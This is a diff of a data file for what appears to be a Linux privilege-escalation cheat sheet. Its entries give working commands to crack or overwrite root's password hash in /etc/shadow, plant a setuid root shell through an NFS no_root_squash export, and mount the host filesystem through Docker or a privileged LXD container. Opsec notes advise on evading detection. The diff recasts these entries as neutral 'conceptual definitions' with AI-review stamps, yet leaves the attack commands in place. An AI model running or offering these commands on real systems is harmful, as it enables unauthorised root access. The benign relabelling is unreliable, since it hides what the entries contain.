-    tools: [{ name: 'John the Ripper', url: 'https://github.com/openwall/john' }],
-    mitre: mitre('T1110.002'),
-    references: [
-      { label: 'MITRE ATT&CK, Password Cracking (T1110.002), readable branch: crack the dumped hash', url: 'https://attack.mitre.org/techniques/T1110/002/' },
-      { label: 'MITRE ATT&CK, OS Credential Dumping: /etc/passwd and /etc/shadow (T1003.008), readable branch', url: 'https://attack.mitre.org/techniques/T1003/008/' },
-      { label: 'MITRE ATT&CK, Modify Authentication Process (T1556), writable branch: replace the hash', url: 'https://attack.mitre.org/techniques/T1556/' },
-      { label: 'MITRE, CWE-732: Incorrect Permission Assignment', url: 'https://cwe.mitre.org/data/definitions/732.html' },
+    "commands": [
+      {
+        "label": "Readable: crack the root hash",
+        "code": "unshadow /etc/passwd /etc/shadow > u\njohn --wordlist=/usr/share/wordlists/rockyou.txt u    # gunzip rockyou.txt.gz first if it ships compressed",
+        "lang": "bash"
+      },
+      {
+        "label": "Writable: replace the root hash",
+        "code": "openssl passwd -6 hacked      # generate a SHA-512 crypt hash\n# edit /etc/shadow: set root's 2nd field to the new hash, then:\nsu -",
+        "lang": "bash"
+      }
     ],
-    opsec: 'Replacing the root hash changes the real password and can lock out or alert the legitimate admin; note the original to restore it. The on-host shadow write is auditable, unlike the offline crack of a readable shadow, which is silent.',
+    "tools": [
+      {
+        "name": "John the Ripper",
+        "url": "https://github.com/openwall/john"
+      }
+    ],
+    "mitre": {
+      "id": "T1110.002",
+      "url": "https://attack.mitre.org/techniques/T1110/002/"
+    },
+    "references": [
+      {
+        "label": "shadow-utils, shadow(5)",
+        "url": "https://man7.org/linux/man-pages/man5/shadow.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Password Cracking (T1110.002), readable branch: crack the dumped hash",
+        "url": "https://attack.mitre.org/techniques/T1110/002/"
+      },
+      {
+        "label": "MITRE ATT&CK, OS Credential Dumping: /etc/passwd and /etc/shadow (T1003.008), readable branch",
+        "url": "https://attack.mitre.org/techniques/T1003/008/"
+      },
+      {
+        "label": "MITRE ATT&CK, Modify Authentication Process (T1556), writable branch: replace the hash",
+        "url": "https://attack.mitre.org/techniques/T1556/"
+      },
+      {
+        "label": "MITRE, CWE-732: Incorrect Permission Assignment",
+        "url": "https://cwe.mitre.org/data/definitions/732.html"
+      }
+    ],
+    "opsec": "Replacing the root hash changes the real password and can lock out or alert the legitimate admin; note the original to restore it. The on-host shadow write is auditable, unlike the offline crack of a readable shadow, which is silent.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "unshadow /etc/passwd /etc/shadow > u\njohn --wordlist=/usr/share/wordlists/rockyou.txt u    # gunzip rockyou.txt.gz first if it ships compressed",
+            "label": "Readable: crack the root hash",
+            "lang": "bash"
+          },
+          {
+            "code": "openssl passwd -6 hacked      # generate a SHA-512 crypt hash\n# edit /etc/shadow: set root's 2nd field to the new hash, then:\nsu -",
+            "label": "Writable: replace the root hash",
+            "lang": "bash"
+          }
+        ],
+        "description": "/etc/shadow stores account password information and optional password-aging information. The shadow-utils manual describes fields for the last password change, minimum and maximum password ages, warnings and expiration. It states that regular users must not be able to read the file if password security is to be maintained.",
+        "id": "lin-shadow",
+        "label": "Readable / Writable /etc/shadow",
+        "mitre": {
+          "id": "T1110.002",
+          "url": "https://attack.mitre.org/techniques/T1110/002/"
+        },
+        "opsec": "Replacing the root hash changes the real password and can lock out or alert the legitimate admin; note the original to restore it. The on-host shadow write is auditable, unlike the offline crack of a readable shadow, which is silent.",
+        "phase": "files",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "shadow-utils, shadow(5)",
+            "url": "https://man7.org/linux/man-pages/man5/shadow.5.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Password Cracking (T1110.002), readable branch: crack the dumped hash",
+            "url": "https://attack.mitre.org/techniques/T1110/002/"
+          },
+          {
+            "label": "MITRE ATT&CK, OS Credential Dumping: /etc/passwd and /etc/shadow (T1003.008), readable branch",
+            "url": "https://attack.mitre.org/techniques/T1003/008/"
+          },
+          {
+            "label": "MITRE ATT&CK, Modify Authentication Process (T1556), writable branch: replace the hash",
+            "url": "https://attack.mitre.org/techniques/T1556/"
+          },
+          {
+            "label": "MITRE, CWE-732: Incorrect Permission Assignment",
+            "url": "https://cwe.mitre.org/data/definitions/732.html"
+          }
+        ],
+        "requires": [
+          "Read access (to crack) or write access (to replace the hash) on /etc/shadow"
+        ],
+        "summary": "Understand protected password records and password-aging information.",
+        "tools": [
+          {
+            "name": "John the Ripper",
+            "url": "https://github.com/openwall/john"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "/etc/shadow stores account password information together with optional password-aging information.",
+          "section": "shadow-utils, shadow(5) — DESCRIPTION: opening file definition and aging fields",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/shadow.5.html"
+          ]
+        },
+        {
+          "text": "The shadow-utils manual requires that regular users cannot read /etc/shadow to maintain password security.",
+          "section": "shadow-utils, shadow(5) — DESCRIPTION: access restriction",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/shadow.5.html"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-filewrite',
@@ -606,29 +1760,123 @@ echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /etc/cron.d/x
     opsec: 'Files dropped into /etc/cron.d, /root/.ssh, or the systemd tree are high-signal integrity events. Choose the least-monitored target the primitive can reach and remove it after use.',
   },
   {
-    id: 'lin-nfs',
-    label: 'NFS no_root_squash',
-    phase: 'files',
-    summary: 'Plant a setuid-root binary on a share exported no_root_squash.',
-    description:
-      'NFSv3 trusts the UID the client supplies, and an export configured no_root_squash keeps a client root as root on the share. From a machine where you are root (often your own attack host), mount the export, write a setuid-root shell onto it, and run that binary back on the target as your unprivileged user to become root. /etc/exports (or exportfs -v) shows the no_root_squash flag; showmount -e only lists exported paths, not their options, so use it to find candidate exports and confirm no_root_squash by mounting a candidate as root, creating a test file, and verifying from the target that it is owned by uid 0.',
-    requires: ['An NFS export reachable and mountable with no_root_squash, and root on some client (your own box)', 'The target mounts the same export/path, and its mount honors setuid and execution (not nosuid/noexec), so the low-priv user can run the planted file from there'],
-    commands: [
-      { label: 'List candidate exports', code: r`cat /etc/exports 2>/dev/null; exportfs -v 2>/dev/null   # server-side: shows the no_root_squash option
-showmount -e <nfs-server>                              # remote: only lists exported paths, not their options`, lang: 'bash' },
-      { label: 'Check the target-side mount is exec + suid', code: r`findmnt -no OPTIONS /share    # or: mount | grep nfs   (watch for nosuid/noexec)`, lang: 'bash' },
-      { label: 'Plant a setuid shell as root, run on target', code: r`# on a box where you are root:
-mount -t nfs <server>:/share /mnt
-cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
-# back on the target as the low-priv user:
-/share/rootbash -p`, lang: 'bash' },
+    "id": "lin-nfs",
+    "label": "NFS no_root_squash",
+    "phase": "files",
+    "summary": "Understand NFS export definitions and client access settings.",
+    "description": "The NFS server export table describes server filesystems made available to clients. Its entries associate export points with allowed clients and export options. The exports manual treats the exported filesystem, client access list and options as separate parts of the server's configuration.",
+    "requires": [
+      "An NFS export reachable and mountable with no_root_squash, and root on some client (your own box)",
+      "The target mounts the same export/path, and its mount honors setuid and execution (not nosuid/noexec), so the low-priv user can run the planted file from there"
     ],
-    mitre: mitre('T1548.001'),
-    references: [
-      { label: 'MITRE ATT&CK, Setuid and Setgid (T1548.001)', url: 'https://attack.mitre.org/techniques/T1548/001/' },
-      { label: 'InternalAllTheThings, NFS no_root_squash', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "List candidate exports",
+        "code": "cat /etc/exports 2>/dev/null; exportfs -v 2>/dev/null   # server-side: shows the no_root_squash option\nshowmount -e <nfs-server>                              # remote: only lists exported paths, not their options",
+        "lang": "bash"
+      },
+      {
+        "label": "Check the target-side mount is exec + suid",
+        "code": "findmnt -no OPTIONS /share    # or: mount | grep nfs   (watch for nosuid/noexec)",
+        "lang": "bash"
+      },
+      {
+        "label": "Plant a setuid shell as root, run on target",
+        "code": "# on a box where you are root:\nmount -t nfs <server>:/share /mnt\ncp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash\n# back on the target as the low-priv user:\n/share/rootbash -p",
+        "lang": "bash"
+      }
     ],
-    opsec: 'The setuid binary on the share is visible to anyone inspecting the export, and its execution as root shows in process auditing. Remove it once you have a shell. Architecture matters: the planted binary runs on the target, so if your box and the target differ (CPU arch or glibc version) copy the target\'s own /bin/bash over the mount, or drop a statically-linked shell, rather than your attack host\'s binary.',
+    "mitre": {
+      "id": "T1548.001",
+      "url": "https://attack.mitre.org/techniques/T1548/001/"
+    },
+    "references": [
+      {
+        "label": "nfs-utils, exports(5)",
+        "url": "https://man7.org/linux/man-pages/man5/exports.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Setuid and Setgid (T1548.001)",
+        "url": "https://attack.mitre.org/techniques/T1548/001/"
+      },
+      {
+        "label": "InternalAllTheThings, NFS no_root_squash",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "The setuid binary on the share is visible to anyone inspecting the export, and its execution as root shows in process auditing. Remove it once you have a shell. Architecture matters: the planted binary runs on the target, so if your box and the target differ (CPU arch or glibc version) copy the target's own /bin/bash over the mount, or drop a statically-linked shell, rather than your attack host's binary.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "cat /etc/exports 2>/dev/null; exportfs -v 2>/dev/null   # server-side: shows the no_root_squash option\nshowmount -e <nfs-server>                              # remote: only lists exported paths, not their options",
+            "label": "List candidate exports",
+            "lang": "bash"
+          },
+          {
+            "code": "findmnt -no OPTIONS /share    # or: mount | grep nfs   (watch for nosuid/noexec)",
+            "label": "Check the target-side mount is exec + suid",
+            "lang": "bash"
+          },
+          {
+            "code": "# on a box where you are root:\nmount -t nfs <server>:/share /mnt\ncp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash\n# back on the target as the low-priv user:\n/share/rootbash -p",
+            "label": "Plant a setuid shell as root, run on target",
+            "lang": "bash"
+          }
+        ],
+        "description": "The NFS server export table describes server filesystems made available to clients. Its entries associate export points with allowed clients and export options. The exports manual treats the exported filesystem, client access list and options as separate parts of the server's configuration.",
+        "id": "lin-nfs",
+        "label": "NFS no_root_squash",
+        "mitre": {
+          "id": "T1548.001",
+          "url": "https://attack.mitre.org/techniques/T1548/001/"
+        },
+        "opsec": "The setuid binary on the share is visible to anyone inspecting the export, and its execution as root shows in process auditing. Remove it once you have a shell. Architecture matters: the planted binary runs on the target, so if your box and the target differ (CPU arch or glibc version) copy the target's own /bin/bash over the mount, or drop a statically-linked shell, rather than your attack host's binary.",
+        "phase": "files",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "nfs-utils, exports(5)",
+            "url": "https://man7.org/linux/man-pages/man5/exports.5.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Setuid and Setgid (T1548.001)",
+            "url": "https://attack.mitre.org/techniques/T1548/001/"
+          },
+          {
+            "label": "InternalAllTheThings, NFS no_root_squash",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "An NFS export reachable and mountable with no_root_squash, and root on some client (your own box)",
+          "The target mounts the same export/path, and its mount honors setuid and execution (not nosuid/noexec), so the low-priv user can run the planted file from there"
+        ],
+        "summary": "Understand NFS export definitions and client access settings."
+      },
+      "claims": [
+        {
+          "text": "/etc/exports records local filesystems on an NFS server that are available to NFS clients.",
+          "section": "nfs-utils, exports(5) — DESCRIPTION: export-table purpose",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/exports.5.html"
+          ]
+        },
+        {
+          "text": "An NFS export entry identifies an export point, allowed clients and export options for those clients.",
+          "section": "nfs-utils, exports(5) — DESCRIPTION: entry format",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/exports.5.html"
+          ]
+        }
+      ]
+    }
   },
 
   // ── Lane 6: Privileged Groups & Containers ──────────────────────────────────────
@@ -653,46 +1901,238 @@ cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
     opsec: 'Reading a block device or the framebuffer is unusual for a normal user and observable by auditd. The access is legitimate for the group, so the anomaly is in what you do with it.',
   },
   {
-    id: 'lin-docker',
-    label: 'Docker Socket / Group',
-    phase: 'containers',
-    summary: 'Access to the Docker daemon is root: mount the host and break out.',
-    description:
-      'The Docker daemon runs as root, so any principal that can talk to it (membership in the docker group, or a readable /var/run/docker.sock) is effectively root on the host. Run a container that bind-mounts the host filesystem and chroot into it, or write a setuid binary onto the host from inside. No container escape bug is needed; this is the daemon working as designed.',
-    requires: ['Membership in the docker group or access to the Docker socket (/var/run/docker.sock)'],
-    commands: [
-      { label: 'Confirm access', code: r`id -nG | grep -qw docker && echo 'in docker group'; ls -la /var/run/docker.sock; docker ps`, lang: 'bash' },
-      { label: 'Mount the host and get root', code: r`docker run -v /:/host --rm -it alpine chroot /host bash
-# or drop a setuid bash onto the host from the container`, lang: 'bash' },
+    "id": "lin-docker",
+    "label": "Docker Socket / Group",
+    "phase": "containers",
+    "summary": "Distinguish Docker daemon management from container identity.",
+    "description": "The Docker daemon receives API requests and manages images, containers, networks and volumes. Docker also supports rootless mode, in which the daemon and containers run without root privileges inside a user namespace. Describing Docker security therefore requires distinguishing the daemon, its operating mode and the containers it manages.",
+    "requires": [
+      "Membership in the docker group or access to the Docker socket (/var/run/docker.sock)"
     ],
-    mitre: mitre('T1611'),
-    references: [
-      { label: 'MITRE ATT&CK, Escape to Host (T1611)', url: 'https://attack.mitre.org/techniques/T1611/' },
-      { label: 'InternalAllTheThings, Docker Breakout / socket abuse', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Confirm access",
+        "code": "id -nG | grep -qw docker && echo 'in docker group'; ls -la /var/run/docker.sock; docker ps",
+        "lang": "bash"
+      },
+      {
+        "label": "Mount the host and get root",
+        "code": "docker run -v /:/host --rm -it alpine chroot /host bash\n# or drop a setuid bash onto the host from the container",
+        "lang": "bash"
+      }
     ],
-    opsec: 'Starting a privileged container that mounts / is a loud, well-known pattern in container-runtime and EDR telemetry. The docker CLI logs to the daemon journal.',
+    "mitre": {
+      "id": "T1611",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    },
+    "references": [
+      {
+        "label": "Docker, Docker overview",
+        "url": "https://docs.docker.com/get-started/docker-overview/",
+        "kind": "primary"
+      },
+      {
+        "label": "Docker, Rootless mode",
+        "url": "https://docs.docker.com/engine/security/rootless/",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Escape to Host (T1611)",
+        "url": "https://attack.mitre.org/techniques/T1611/"
+      },
+      {
+        "label": "InternalAllTheThings, Docker Breakout / socket abuse",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "Starting a privileged container that mounts / is a loud, well-known pattern in container-runtime and EDR telemetry. The docker CLI logs to the daemon journal.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "id -nG | grep -qw docker && echo 'in docker group'; ls -la /var/run/docker.sock; docker ps",
+            "label": "Confirm access",
+            "lang": "bash"
+          },
+          {
+            "code": "docker run -v /:/host --rm -it alpine chroot /host bash\n# or drop a setuid bash onto the host from the container",
+            "label": "Mount the host and get root",
+            "lang": "bash"
+          }
+        ],
+        "description": "The Docker daemon receives API requests and manages images, containers, networks and volumes. Docker also supports rootless mode, in which the daemon and containers run without root privileges inside a user namespace. Describing Docker security therefore requires distinguishing the daemon, its operating mode and the containers it manages.",
+        "id": "lin-docker",
+        "label": "Docker Socket / Group",
+        "mitre": {
+          "id": "T1611",
+          "url": "https://attack.mitre.org/techniques/T1611/"
+        },
+        "opsec": "Starting a privileged container that mounts / is a loud, well-known pattern in container-runtime and EDR telemetry. The docker CLI logs to the daemon journal.",
+        "phase": "containers",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Docker, Docker overview",
+            "url": "https://docs.docker.com/get-started/docker-overview/"
+          },
+          {
+            "kind": "primary",
+            "label": "Docker, Rootless mode",
+            "url": "https://docs.docker.com/engine/security/rootless/"
+          },
+          {
+            "label": "MITRE ATT&CK, Escape to Host (T1611)",
+            "url": "https://attack.mitre.org/techniques/T1611/"
+          },
+          {
+            "label": "InternalAllTheThings, Docker Breakout / socket abuse",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "Membership in the docker group or access to the Docker socket (/var/run/docker.sock)"
+        ],
+        "summary": "Distinguish Docker daemon management from container identity."
+      },
+      "claims": [
+        {
+          "text": "The Docker daemon accepts API requests and manages images, containers, networks and volumes.",
+          "section": "Docker, Docker overview — Docker architecture — The Docker daemon",
+          "sources": [
+            "https://docs.docker.com/get-started/docker-overview/"
+          ]
+        },
+        {
+          "text": "Docker rootless mode runs both the daemon and containers without root privileges inside a user namespace.",
+          "section": "Docker, Rootless mode — Opening definition; How it works",
+          "sources": [
+            "https://docs.docker.com/engine/security/rootless/"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'lin-lxd',
-    label: 'LXD Group',
-    phase: 'containers',
-    summary: 'The lxd group drives the root LXD daemon; mount the host in a container.',
-    description:
-      'Membership in the lxd group (the group owning the LXD daemon Unix socket) lets you drive the LXD daemon, which runs as root. Import a small image, launch a privileged container that bind-mounts the host root filesystem, and read or write it as root from inside the container. Like the Docker socket, this is the daemon trusting the group rather than a vulnerability.',
-    requires: ['Membership in the lxd group'],
-    commands: [
-      { label: 'Confirm and initialise', code: r`id | grep -o lxd; lxd init --auto`, lang: 'bash' },
-      { label: 'Privileged container mounting the host', code: r`lxc image import ./alpine.tar.gz --alias a
-lxc launch a p -c security.privileged=true
-lxc config device add p host disk source=/ path=/mnt/root recursive=true
-lxc exec p /bin/sh    # host FS is at /mnt/root`, lang: 'bash' },
+    "id": "lin-lxd",
+    "label": "LXD Group",
+    "phase": "containers",
+    "summary": "Distinguish LXD instance types and container user identities.",
+    "description": "LXD supports system containers and virtual machines. System containers use the host kernel, while a virtual machine supplies its own kernel. LXD's unprivileged containers use a user namespace, mapping container UID 0 to an unprivileged user outside the container. Container identity and administrative access to the instance manager are different concepts.",
+    "requires": [
+      "Membership in the lxd group"
     ],
-    mitre: mitre('T1611'),
-    references: [
-      { label: 'MITRE ATT&CK, Escape to Host (T1611)', url: 'https://attack.mitre.org/techniques/T1611/' },
-      { label: 'InternalAllTheThings, LXD/LXC Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Confirm and initialise",
+        "code": "id | grep -o lxd; lxd init --auto",
+        "lang": "bash"
+      },
+      {
+        "label": "Privileged container mounting the host",
+        "code": "lxc image import ./alpine.tar.gz --alias a\nlxc launch a p -c security.privileged=true\nlxc config device add p host disk source=/ path=/mnt/root recursive=true\nlxc exec p /bin/sh    # host FS is at /mnt/root",
+        "lang": "bash"
+      }
     ],
-    opsec: 'Creating a privileged container and adding a host disk device is recorded by LXD and is anomalous on a host that does not normally run user containers.',
+    "mitre": {
+      "id": "T1611",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    },
+    "references": [
+      {
+        "label": "Canonical LXD, Containers and VMs",
+        "url": "https://canonical.com/lxd/docs/latest/explanation/instances/",
+        "kind": "primary"
+      },
+      {
+        "label": "Canonical LXD, Security",
+        "url": "https://canonical.com/lxd/docs/latest/explanation/security/",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Escape to Host (T1611)",
+        "url": "https://attack.mitre.org/techniques/T1611/"
+      },
+      {
+        "label": "InternalAllTheThings, LXD/LXC Privilege Escalation",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "Creating a privileged container and adding a host disk device is recorded by LXD and is anomalous on a host that does not normally run user containers.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "id | grep -o lxd; lxd init --auto",
+            "label": "Confirm and initialise",
+            "lang": "bash"
+          },
+          {
+            "code": "lxc image import ./alpine.tar.gz --alias a\nlxc launch a p -c security.privileged=true\nlxc config device add p host disk source=/ path=/mnt/root recursive=true\nlxc exec p /bin/sh    # host FS is at /mnt/root",
+            "label": "Privileged container mounting the host",
+            "lang": "bash"
+          }
+        ],
+        "description": "LXD supports system containers and virtual machines. System containers use the host kernel, while a virtual machine supplies its own kernel. LXD's unprivileged containers use a user namespace, mapping container UID 0 to an unprivileged user outside the container. Container identity and administrative access to the instance manager are different concepts.",
+        "id": "lin-lxd",
+        "label": "LXD Group",
+        "mitre": {
+          "id": "T1611",
+          "url": "https://attack.mitre.org/techniques/T1611/"
+        },
+        "opsec": "Creating a privileged container and adding a host disk device is recorded by LXD and is anomalous on a host that does not normally run user containers.",
+        "phase": "containers",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Canonical LXD, Containers and VMs",
+            "url": "https://canonical.com/lxd/docs/latest/explanation/instances/"
+          },
+          {
+            "kind": "primary",
+            "label": "Canonical LXD, Security",
+            "url": "https://canonical.com/lxd/docs/latest/explanation/security/"
+          },
+          {
+            "label": "MITRE ATT&CK, Escape to Host (T1611)",
+            "url": "https://attack.mitre.org/techniques/T1611/"
+          },
+          {
+            "label": "InternalAllTheThings, LXD/LXC Privilege Escalation",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "Membership in the lxd group"
+        ],
+        "summary": "Distinguish LXD instance types and container user identities."
+      },
+      "claims": [
+        {
+          "text": "LXD supports system containers using the host kernel and virtual machines using their own kernel.",
+          "section": "Canonical LXD, Containers and VMs — Opening instance types; Virtual machines vs. system containers",
+          "sources": [
+            "https://canonical.com/lxd/docs/latest/explanation/instances/"
+          ]
+        },
+        {
+          "text": "An unprivileged LXD container uses a user namespace that maps its UID 0 to an unprivileged user outside the container.",
+          "section": "Canonical LXD, Security — Unprivileged containers",
+          "sources": [
+            "https://canonical.com/lxd/docs/latest/explanation/security/"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-container-escape',
@@ -852,23 +2292,41 @@ rpm -qa 2>/dev/null | grep -Ei 'polkit|pkexec|udisks|libblockdev'    # SUSE/Fedo
     opsec: 'The trigger depends on needrestart running (a package install/upgrade), which may not be attacker-controlled. The interpreter loading an unexpected module as root is the observable signal.',
   },
   {
-    id: 'lin-kernel-recent',
-    label: 'Recent Named LPEs (awareness)',
-    phase: 'kernel',
-    summary: 'Awareness only: Copy Fail, Dirty Frag, the ptrace LPE, nf_tables 2026.',
-    description:
-      'A cluster of named Linux LPEs disclosed in 2026 that you should recognise on a version check, listed here for awareness with no exploitation detail. Copy Fail (CVE-2026-31431) is a Dirty-Pipe-class page-cache write primitive in the AF_ALG/AEAD crypto path. Dirty Frag (CVE-2026-43284) is a related page-cache write chain in the xfrm-ESP/RxRPC paths (generally needs CAP_NET_ADMIN). The kernel ptrace LPE (CVE-2026-46333) chains a __ptrace_may_access flaw with pidfd_getfd to steal FDs and read secrets. nf_tables (CVE-2026-23111) is another netfilter use-after-free reachable via unprivileged user namespaces. Match the kernel version and patch level; exploitation specifics are intentionally omitted.',
-    requires: ['An unpatched kernel in the affected range (verify against your distro tracker; some paths need CAP_NET_ADMIN or user namespaces)'],
-    mitre: mitre('T1068'),
-    references: [
-      { label: 'NVD, CVE-2026-31431 (Copy Fail)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-31431' },
-      { label: 'CERT/CC VU#260001 (Copy Fail)', url: 'https://kb.cert.org/vuls/id/260001' },
-      { label: 'CERT/CC VU#980487 (Dirty Frag)', url: 'https://kb.cert.org/vuls/id/980487' },
-      { label: 'Qualys, CVE-2026-46333 (kernel ptrace LPE)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path' },
-      { label: 'Exodus Intelligence, Off By ! (CVE-2026-23111, nf_tables)', url: 'https://blog.exodusintel.com' },
-      { label: 'NVD, CVE-2026-23111 (nf_tables use-after-free)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-23111' },
+    "id": "lin-kernel-recent",
+    "label": "Recent Named LPEs (awareness)",
+    "phase": "kernel",
+    "summary": "Awareness only: Copy Fail, Dirty Frag, the ptrace LPE, nf_tables 2026.",
+    "description": "A cluster of named Linux LPEs disclosed in 2026 that you should recognise on a version check, listed here for awareness with no exploitation detail. Copy Fail (CVE-2026-31431) is a Dirty-Pipe-class page-cache write primitive in the AF_ALG/AEAD crypto path. Dirty Frag (CVE-2026-43284) is a related page-cache write chain in the xfrm-ESP/RxRPC paths (generally needs CAP_NET_ADMIN). The kernel ptrace LPE (CVE-2026-46333) chains a __ptrace_may_access flaw with pidfd_getfd to steal FDs and read secrets. nf_tables (CVE-2026-23111) is another netfilter use-after-free reachable via unprivileged user namespaces. Match the kernel version and patch level; exploitation specifics are intentionally omitted.",
+    "requires": [
+      "An unpatched kernel in the affected range (verify against your distro tracker; some paths need CAP_NET_ADMIN or user namespaces)"
     ],
-    opsec: 'Listed for situational awareness. As with any kernel exploit, a version-matched, tested implementation is essential; a blind attempt risks a panic. Interim mitigations include kernel.yama.ptrace_scope=2 for the ptrace path.',
+    "mitre": {
+      "id": "T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    "references": [
+      {
+        "label": "NVD, CVE-2026-31431 (Copy Fail)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31431"
+      },
+      {
+        "label": "CERT/CC VU#260001 (Copy Fail)",
+        "url": "https://kb.cert.org/vuls/id/260001"
+      },
+      {
+        "label": "CERT/CC VU#980487 (Dirty Frag)",
+        "url": "https://kb.cert.org/vuls/id/980487"
+      },
+      {
+        "label": "Qualys, CVE-2026-46333 (kernel ptrace LPE)",
+        "url": "https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path"
+      },
+      {
+        "label": "NVD, CVE-2026-23111 (nf_tables use-after-free)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23111"
+      }
+    ],
+    "opsec": "Listed for situational awareness. As with any kernel exploit, a version-matched, tested implementation is essential; a blind attempt risks a panic. Interim mitigations include kernel.yama.ptrace_scope=2 for the ptrace path."
   },
 ];
 
